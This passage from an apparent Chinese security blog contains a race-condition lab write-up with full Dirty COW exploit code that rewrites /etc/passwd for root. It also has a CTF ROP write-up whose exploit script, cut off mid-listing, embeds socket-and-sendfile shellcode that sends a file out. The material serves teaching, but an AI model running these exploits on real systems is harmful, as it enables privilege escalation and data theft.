class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uid_t</span> real_uid = getuid(); <span class="comment">// real uid</span></span><br><span class="line">    <span class="type">uid_t</span> eff_uid = geteuid(); <span class="comment">// effective user id</span></span><br><span class="line">    seteuid(real_uid); <span class="comment">// set it to the real uid</span></span><br><span class="line">    <span class="type">char</span>* fn = <span class="string">&quot;/tmp/XYZ&quot;</span>;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">60</span>];</span><br><span class="line">    FILE* fp;</span><br><span class="line">    <span class="comment">/* get user input */</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%50s&quot;</span>, buffer);</span><br><span class="line">    <span class="keyword">if</span> (!access(fn, W_OK)) &#123;</span><br><span class="line">        <span class="comment">//sleep(10);</span></span><br><span class="line">        fp = fopen(fn, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!fp) &#123;</span><br><span class="line">            perror(<span class="string">&quot;Open failed&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        fwrite(<span class="string">&quot;\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="number">1</span>, fp);</span><br><span class="line">        fwrite(buffer, <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="built_in">strlen</span>(buffer), fp);</span><br><span class="line">        fclose(fp);</span><br><span class="line">        seteuid(eff_uid); <span class="comment">// set back effective user id </span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No permission \n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现即使有的时候能够执行到open语句，也无法成功了。即使我们程序依然是4755权限。因为此时我们在打开文件时，权限已经被改为用户(执行者)的，无法修改/etc/passwd。</p><p><img src="/2022/05/04/software-security-lab4/image-20220504145216100.png" alt="image-20220504145216100"></p><h2 id="task3-b"><a href="#task3-b" class="headerlink" title="task3.b"></a>task3.b</h2><p>同样的，尝试使用pdf里面给出的。下面这条命令开启了对于符号链接的保护。也就是说我们不能对有粘滞bit的文件夹中的符号链接做解引用。</p><p><img src="/2022/05/04/software-security-lab4/image-20220504145522957.png" alt="image-20220504145522957"></p><p>运行之前没有setuid的程序，发现也无法成功了。</p><p><img src="/2022/05/04/software-security-lab4/image-20220504145628875.png" alt="image-20220504145628875"></p><p>这样的原因可以见<a href="https://www.kernel.org/doc/Documentation/sysctl/fs.txt">网站</a></p><p><img src="/2022/05/04/software-security-lab4/image-20220504145917668.png" alt="image-20220504145917668"></p><p>这里设置为1之后，就相当于”sticky world-writable”的符号链接文件不允许我们follow，也就是无法通过/tmp文件夹中的文件进入别的地方，只有当符号链接的uid和想要通过这个符号链接访问别的东西的人的uid是一样的时候才行。</p><p>这样相当于我们在/tmp文件夹下的所有符号链接都设置了一个seteuid，确保了访问符号链接的用户一定和真实用户是一致的。</p><p><strong>在本练习中</strong>，漏洞程序是root身份，/tmp的拥有者也是root，但是符号链接的创建者是seed。这就使得上述保护激活，从而不允许root的进程使用符号链接。</p><p><strong>局限性</strong>：</p><p><strong>这个保护只针对tmp文件夹下的符号链接。如果是其他文件夹下面，依然可以成功。</strong>推测可能在现实某个场景中，用户只能访问/tmp路径。</p><h2 id="保护措施"><a href="#保护措施" class="headerlink" title="保护措施"></a>保护措施</h2><p>其实task3讲了一些linux的保护措施。其实也有一些别的，这里来总结一下</p><ol><li>ubuntu的在全局可写文件夹中是否能够使用符号链接的保护。(task3.b)这使得我们在部分情况下不能对有粘滞bit的文件夹中的符号链接做解引用，这样我们就不能在/tmp里面放符号链接了。 ==为什么只限制/tmp?==</li></ol><p>具体来说，粘滞符号链接保护如下所示。</p><table><thead><tr><th>执行者</th><th>目录所有者</th><th>符号链接所有者</th><th>是否可以访问</th></tr></thead><tbody><tr><td>seed</td><td>seed</td><td>seed</td><td>可以</td></tr><tr><td>seed</td><td>seed</td><td>root</td><td>不可以</td></tr><tr><td>seed</td><td>root</td><td>seed</td><td>可以</td></tr><tr><td>seed</td><td>root</td><td>root</td><td>可以</td></tr><tr><td>root</td><td>seed</td><td>seed</td><td>可以</td></tr><tr><td>root</td><td>seed</td><td>root</td><td>可以</td></tr><tr><td><strong>root</strong></td><td><strong>root</strong></td><td><strong>seed</strong></td><td><strong>不可以</strong></td></tr><tr><td>root</td><td>root</td><td>root</td><td>可以</td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table><p>(黑体部分为，如果我们创建了一个root的/tmp/XYZ时，攻击不能成功的原因。我们不能解引用此符号链接文件了)</p><ol start="2"><li><strong>把检查和使用的操作原子化</strong>。如下面的代码，可以实现检查文件和打开的原子化操作。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f = open(file, O_CREAT | O_EXCL);</span><br></pre></td></tr></table></figure><ol start="3"><li>每次open时，<strong>检查read uid而不是effective uid</strong>（就相当于上面的seteuid自动执行了）但是这个选项在linux中还没有。</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f = open(file, O_WRITE | O_REAL_USER_ID);</span><br></pre></td></tr></table></figure><ol start="4"><li>利用access和open在代码中多次打开同一个文件，并且确保在所有被打开的文件<strong>全部相同的时候</strong>，再打开文件。因此攻击者必须确保所有文件同时竞争成功，才能完成攻击。</li></ol><h1 id="dirty-COW"><a href="#dirty-COW" class="headerlink" title="dirty COW"></a>dirty COW</h1><p>这是第二个条件竞争漏洞。</p><h2 id="task1-1"><a href="#task1-1" class="headerlink" title="task1.1"></a>task1.1</h2><p>我们用和pdf中完全一样的输入序列。创建一个用户不可写入的文件。</p><p><img src="/2022/05/04/software-security-lab4/image-20220504153040487.png" alt="image-20220504153040487"></p><h2 id="task1-2"><a href="#task1-2" class="headerlink" title="task1.2"></a>task1.2</h2><p>我们首先以只读的方式打开文件(从之前的cat可以看出，这也是可行的)并映射一段内存出来，用来储存文件内容。在这之后，我们分为两步进行这次攻击。</p><h3 id="write-thread"><a href="#write-thread" class="headerlink" title="write thread"></a>write thread</h3><p>write首先去内存中找到我们的目标(222222)的偏移(利用strstr)，之后利用fseek找到所在位置。并且mmap的内存中写入数据。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *content= <span class="string">&quot;******&quot;</span>;</span><br><span class="line">  <span class="type">off_t</span> offset = (<span class="type">off_t</span>) arg;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> f=open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// Move the file pointer to the corresponding position.</span></span><br><span class="line">    lseek(f, offset, SEEK_SET);</span><br><span class="line">    <span class="comment">// Write to the memory.</span></span><br><span class="line">    write(f, content, <span class="built_in">strlen</span>(content));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="madvise-thread"><a href="#madvise-thread" class="headerlink" title="madvise thread"></a>madvise thread</h3><p>这个线程主要调用<code>madvise</code>。看到man madvise中MADV_DONTNEED的含义。</p><p><img src="/2022/05/04/software-security-lab4/image-20220504160313380.png" alt="image-20220504160313380"></p><p>这个意思是，当前这个进程已经用好了这一片内存，在最近的一段时间内不需要在使用了。操作系统可以把这一片内存释放了。</p><h3 id="如何成功"><a href="#如何成功" class="headerlink" title="如何成功"></a>如何成功</h3><p>当write的syscall发生时，如果我们调用了madvise，就会把write现在正在写的页表丢弃，而如果现在又切换回write，write现在在写的页表就变成了目标文件的内容，也就是只读文件的内容。具体来说，漏洞触发原理和copy on write机制相关。</p><p>首先是这两句。我们把只读文件以私有映射的方式映射到mmap出来的一片内存上。注意<code>MAP_PRIVATE</code>的flag表示我们并不直接对源文件写入，而是创建一片新的内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Open the target file in the read-only mode.</span></span><br><span class="line"><span class="type">int</span> f=open(<span class="string">&quot;/zzz&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Map the file to COW memory using MAP_PRIVATE.</span></span><br><span class="line">fstat(f, &amp;st);</span><br><span class="line">file_size = st.st_size;</span><br><span class="line"><span class="built_in">map</span>=mmap(<span class="literal">NULL</span>, file_size, PROT_READ, MAP_PRIVATE, f, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>在创造了这样一篇内存之后，由于复制需要时间，操作系统并不会直接把这一片内容分配一个页面出来，而是等到用户要做修改的时候再复制用户写入的内容，并改变用户进程页表的项目。这样的做法叫做<code>copy on write</code>。</p><p>如果用户丢弃了这样一片空间(使用madvise)，那么页表将会被操作系统回收，之前mmap出来的地址将被<strong>重新指向写入之前的，也就是没有复制时候的地址</strong>。(最关键的地方其实在这里，重新指向写入之前的地址)</p><p>如果我们能够想办法在调用<code>write</code>之后，调用<code>madvise</code>释放空间，之后再回到<code>write</code>，此时write指向的页面就是只读文件所在的页面，这样就能造成对只读文件的修改了。流程如下图所示。</p><p><img src="/2022/05/04/software-security-lab4/cow.png" alt="image-20220504160313380"></p><blockquote><p>思考：为什么写入内存的时候，还是没有检查是否可写呢?</p><p>write进行私有写的过程中，一共经过了三步1. 对映射的物理内存做了一份拷贝 2.更新页表，让虚拟内存指向新创建的物理内存 3.写入内存</p><p>因为write如果在已知当前内存是COW类型时，会申请新页面、切换页表的过程(也就是1，2)。而最后一部写入内存时，就不会再检查了。因此，我们可以在最后蓝色方块之前，加入一个条件竞争。一旦madvice成功，就使得写入的实际内存变为/etc/passwd。</p><p>本质上来说，问题还是系统调用write不是原子的。</p></blockquote><p>可以看到，运行<code>cow_attack</code>之后，很快只读文件就被修改了。</p><p><img src="/2022/05/04/software-security-lab4/image-20220504181416634.png" alt="image-20220504181416634"></p><h2 id="获得root权限"><a href="#获得root权限" class="headerlink" title="获得root权限"></a>获得root权限</h2><p>我们首先创建charlie账户，如下所示。可以看到<code>charlie</code>只有一个user权限。</p><p><img src="/2022/05/04/software-security-lab4/image-20220504181542874.png" alt="image-20220504181542874"></p><p>接下来尝试通过dirty cow攻击使得charlie拥有root权限。我们要做的只是修改上面”222222”字符串为”1001”，并且修改的目标为”0”即可，同时把打开的只读文件改为<code>/etc/passwd</code>。这样我们最终将会把<code>charlie</code>的userID设置为0也就是root。</p><p><img src="/2022/05/04/software-security-lab4/image-20220504202325032.png" alt="image-20220504202325032"></p><p>如上所示，我们就获得了一个root的shell。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>最重要的就是查找<code>charlie:x:1001</code>字符串，并将其替换为<code>charlie:x:0000</code>。注意不能只把<code>1001</code>改为<code>0</code>。这样会导致只能改第一位。也就是把<code>charlie:x:1001</code>改成了<code>charlie:x:0001</code>。这样是不能起到攻击效果的。要改一个完整的才行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">pthread_t</span> pth1,pth2;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">  <span class="type">int</span> file_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Open the target file in the read-only mode.</span></span><br><span class="line">  <span class="type">int</span> f=open(<span class="string">&quot;/etc/passwd&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Map the file to COW memory using MAP_PRIVATE.</span></span><br><span class="line">  fstat(f, &amp;st);</span><br><span class="line">  file_size = st.st_size;</span><br><span class="line">  <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>, file_size, PROT_READ, MAP_PRIVATE, f, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Find the position of the target area</span></span><br><span class="line">  <span class="type">char</span> *position = <span class="built_in">strstr</span>(<span class="built_in">map</span>, <span class="string">&quot;charlie:x:1001&quot;</span>);                        </span><br><span class="line"></span><br><span class="line">  <span class="comment">// We have to do the attack using two threads.</span></span><br><span class="line">  pthread_create(&amp;pth1, <span class="literal">NULL</span>, madviseThread, (<span class="type">void</span>  *)file_size); </span><br><span class="line">  pthread_create(&amp;pth2, <span class="literal">NULL</span>, writeThread, position);             </span><br><span class="line"></span><br><span class="line">  <span class="comment">// Wait for the threads to finish.</span></span><br><span class="line">  pthread_join(pth1, <span class="literal">NULL</span>);</span><br><span class="line">  pthread_join(pth2, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *content= <span class="string">&quot;charlie:x:0000&quot;</span>;</span><br><span class="line">  <span class="type">off_t</span> offset = (<span class="type">off_t</span>) arg;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> f=open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// Move the file pointer to the corresponding position.</span></span><br><span class="line">    lseek(f, offset, SEEK_SET);</span><br><span class="line">    <span class="comment">// Write to the memory.</span></span><br><span class="line">    write(f, content, <span class="built_in">strlen</span>(content));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> file_size = (<span class="type">int</span>) arg;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">      madvise(<span class="built_in">map</span>, file_size, MADV_DONTNEED);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> school </category>
          
      </categories>
      
      
        <tags>
            
            <tag> race_condition </tag>
            
            <tag> software-security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnhub2022_easyrop</title>
      <link href="/2022/04/27/pwnhub2022/"/>
      <url>/2022/04/27/pwnhub2022/</url>
      
        <content type="html"><![CDATA[<p>来自pwnhub春季赛的一道题目，比赛的时候看了，完全没有思路。赛后复现发现题目确实很复杂。但是也学到了非常多。包括：能够任意地址写的magic，反向shell，alarm设置rax，构造syscall指令的方法。</p><span id="more"></span><h1 id="easyrop"><a href="#easyrop" class="headerlink" title="easyrop"></a>easyrop</h1><p>逻辑很简单，只不过关了输入输出流。</p><p><img src="/2022/04/27/pwnhub2022/image-20220427143615956.png" alt="image-20220427143615956"></p><p>当时一开始看到的想法是，这个直接重新打开输出流不就完事了?但是可能没有这种选项。</p><p><img src="/2022/04/27/pwnhub2022/image-20220427143836630.png" alt="image-20220427143836630"></p><p>(这里竟然能被检查出来canary也真是醉了…</p><p>同时，题目开了沙箱。也就是允许正规的ORW。但是无法输出</p><p><img src="/2022/04/27/pwnhub2022/image-20220427143929904.png" alt="image-20220427143929904"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>基本想法肯定是ORW。如果不能本地读取，看了wp之后发现还有一种方法，就是自己开一个socket然后在公网服务器上读。这牵涉到很多rop的gardet。因此需要考虑是否有可能把某部分映射成为可执行，也就是调用mprotect。但是怎么控制rax呢？</p><p>这道题给了一个新的思路。以前是通过read返回值可以设置rax，这里<strong>通过将alarm重新设置为0也就是alarm(0)时，会返回没有结束的秒数到寄存器rax中。利用这个特性我们可以获得一个0xf以下的rax。</strong></p><p>因此，可以等待5秒，然后调用alarm(0)，得到eax为10，然后利用ret2csu执行mprotect(bss, 0x1000, 7)。</p><p><img src="/2022/04/27/pwnhub2022/image-20220427144457532.png" alt="image-20220427144457532"></p><p>可以看到这里正好有mprotect这个系统调用，也符合我们写汇编代码的需求。于是我们可以把堆映射为可执行的，从而调一个socket，在公网上完成读flag。</p><p>但是，进一步发现，我们并没有<code>syscall;ret</code>的gardet。这似乎就没法调用mprotect了。</p><p>答案中给出了一个神奇的办法。注意到下面这个gardet。</p><p><code>add dword ptr [rbp - 0x3d], ebx; nop xxxxx; ret</code>是一般的binary都有的。他的opcode是<code>015dc3</code>。</p><p><img src="/2022/04/27/pwnhub2022/image-20220427145207754.png" alt="image-20220427145207754"></p><p>通过以上的gardet，结合ret2csu的gardet。我们就可以<strong>实现一个任意地址写的rop链</strong>。这是一个神奇的操作。而且在一般的binary里面基本都有！</p><p><img src="/2022/04/27/pwnhub2022/image-20220427145329461.png" alt="image-20220427145329461"></p><p>通过这个rop链，我们可以把alarm的got表改成<code>syscall</code>。具体来说如下图所示。我们把alarm的got表的内容(下图中0x00007ffff7e9fd90)改成0x00007ffff7e9fd99即可。</p><p><img src="/2022/04/27/pwnhub2022/image-20220427150610764.png" alt="image-20220427150610764"></p><p>只要把这个修改了，我们就能创造出一个<code>syscall ret</code>的gadget。</p><p>然而，也不是这么容易调用mprotect。因为我们没有pop rdx的gardet。不过我们可以用ret2csu来解决。注意到下面的mov rdx,r15可以用来解决这个问题。</p><p><img src="/2022/04/27/pwnhub2022/image-20220427153218710.png" alt="image-20220427153218710"></p><p>最后。(这个算是一个补充知识)，使用rep的时候(因为我们需要把输入转移到堆上)各个寄存器放什么。如下图，是把esi移动到edi中。</p><p><img src="/2022/04/27/pwnhub2022/image-20220427164128901.png" alt="image-20220427164128901"></p><p>因此，整理一下思路。</p><h3 id="思路的总结"><a href="#思路的总结" class="headerlink" title="思路的总结"></a>思路的总结</h3><ol><li>等待五秒，调用<code>alarm(0)</code>，这里可以直接使用csu来调用。</li><li>上一步结束之后，应该能使得eax变为10(mprotect)，先修改alarm的got表里面改成syscall，之后利用这个syscall结合ret2csu完成一个mprotect修改特定位置的权限。这里选择修改堆为可执行。</li><li>在堆上写好一些rep要用到的指令。包括<code>pop rbp rbx rcx</code>(用于magic方法)、<code>mov rsi rsp ret</code>（用于rep）、<code>rep movs</code>，就是rep，后面在栈上就可以直接使用。注意这里要直接写入16进制的指令数值。用下面的方法</li></ol><p><img src="/2022/04/27/pwnhub2022/image-20220427165707253.png" alt="image-20220427165707253"></p><ol start="4"><li>在栈上写好shellcode，主要是socket+connect+sendfile，使用rep把shellcode拷贝到bss段执行(需要提前在堆上构造一些rep使用所需要的指令)。因为如果不用rep，就要使用上面提到的gardet，可能导致长度不够的问题。</li><li>跳转到堆上执行shellcode</li></ol><p>调试过程十分复杂，光复现就花了五个小时…</p><h2 id="截图"><a href="#截图" class="headerlink" title="截图"></a>截图</h2><h3 id="修改alarm"><a href="#修改alarm" class="headerlink" title="修改alarm"></a>修改alarm</h3><p>修改alarm为syscall。能够实现的原因是用那个magic能够控制任意地址加上一个任意数值。然后alarm在libc里面的内容里面有syscall。因此我们直接把地址加上这么多即可。</p><p><img src="/2022/04/27/pwnhub2022/image-20220427212817318.png" alt="image-20220427212817318"></p><p>下面是改掉之后的结果。</p><p><img src="/2022/04/27/pwnhub2022/image-20220427160338128.png" alt="image-20220427160338128"></p><h3 id="调用mprotect"><a href="#调用mprotect" class="headerlink" title="调用mprotect"></a>调用mprotect</h3><p>可以看到这里的参数，以及最后的alarm+9的内容。</p><p><img src="/2022/04/27/pwnhub2022/image-20220427161512739.png" alt="image-20220427161512739"></p><p>我们把堆映射为RWX的。</p><p><img src="/2022/04/27/pwnhub2022/image-20220427161443802.png" alt="image-20220427161443802"></p><h3 id="寻找相关汇编"><a href="#寻找相关汇编" class="headerlink" title="寻找相关汇编"></a>寻找相关汇编</h3><p>下面这个rep的好难找，真的要自己输入这样的指令。算是借此学到了吧，因为网上真的查不到这样的指令。下面指令的意思是把rsi指针中的数据中内容复制到rdi指针中。(类似于字符串拷贝的汇编)一次拷贝8byte。<strong>拷贝总次数由rcx决定</strong>。是和rep配合起来使用的。</p><p><img src="/2022/04/27/pwnhub2022/image-20220427171103873.png" alt="image-20220427171103873"></p><h3 id="相关系统调用"><a href="#相关系统调用" class="headerlink" title="相关系统调用"></a>相关系统调用</h3><p>一共用到三个系统调用。第一个是本地创建一个socket，用来后续bind。</p><p>第二个是connect，相当于这个socket连接到addr指针中的ip地址和端口(到这里大概明白了为什么要公网IP，因为打远程的时候远程的binary没发链接到自己的虚拟机上，自己的虚拟机本地调试的时候，这里可以在本地监听)</p><p>第三个是sendfile。其中out_fd表示输出到什么文件,in_fd表示从什么文件读。这里我先开的socket，再打开的文件，所以是下面的顺序。offset就不用管了，直接写0，最后是长度。</p><p><img src="/2022/04/27/pwnhub2022/image-20220427185420778.png" alt="image-20220427185420778"></p><p><img src="/2022/04/27/pwnhub2022/image-20220427213159616.png" alt="image-20220427213159616"></p><p><img src="/2022/04/27/pwnhub2022/image-20220427212202690.png" alt="image-20220427212202690"></p><h3 id="最终反向shell拿到flag"><a href="#最终反向shell拿到flag" class="headerlink" title="最终反向shell拿到flag"></a>最终反向shell拿到flag</h3><p><img src="/2022/04/27/pwnhub2022/image-20220427212635790.png" alt="image-20220427212635790"></p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>首先上一个完整的exp。当本地打开127.0.0.1:10001端口监听之后，可以获得一个flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">filename=<span class="string">&quot;./easyrop&quot;</span></span><br><span class="line">io = process(filename)</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">remote_port = <span class="number">10001</span></span><br><span class="line">remote_ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">reverse_shell = <span class="string">b&quot;\x6a\x29\x58\x6a\x06\x5a\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x97\xb0\x2a\x48\xb9\x02\x00&quot;</span>+ \</span><br><span class="line">    remote_port.to_bytes(<span class="number">2</span>, <span class="string">&quot;big&quot;</span>)+socket.inet_aton(remote_ip) + <span class="string">b&quot;\x51\x54\x5e\xb2\x10\x0f\x05&quot;</span></span><br><span class="line">send_flag = <span class="string">b&#x27;\xe8\x05\x00\x00\x00flag\x00_H\x89\xd0H1\xd21\xf6\xb0\x02\x0f\x05H\xc7\xc0(\x00\x00\x00H1\xffH\xc7\xc6\x01\x00\x00\x00H1\xd2I\xc7\xc20\x00\x00\x00\x0f\x05&#x27;</span></span><br><span class="line"><span class="comment"># send_flag = b&quot;\x92\x48\xbb\x2f\x66\x6c\x61\x67\x00\x00\x00\x53\x54\x5f\x31\xf6\xb0\x02\x0f\x05\x96\x87\xfa\x68\x00\x13\x60\x00\x5a\x6a\x30\x41\x5a\x31\xc0\xb0\x28\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x0000000000400618</span> <span class="comment"># add dword ptr [rbp - 0x3d], ebx; nop xxxxx; ret, arbitary write</span></span><br><span class="line">csu = <span class="number">0x4008FA</span> <span class="comment"># pop rbx, pop rbp, pop 4, ret</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400903</span> <span class="comment"># pop rdi</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000400901</span> <span class="comment"># pop rsi,r15,ret</span></span><br><span class="line">pop_rbp_rbx_rcx_ret = <span class="number">0x601500</span></span><br><span class="line">mov_rsi_rsp_ret = <span class="number">0x601600</span></span><br><span 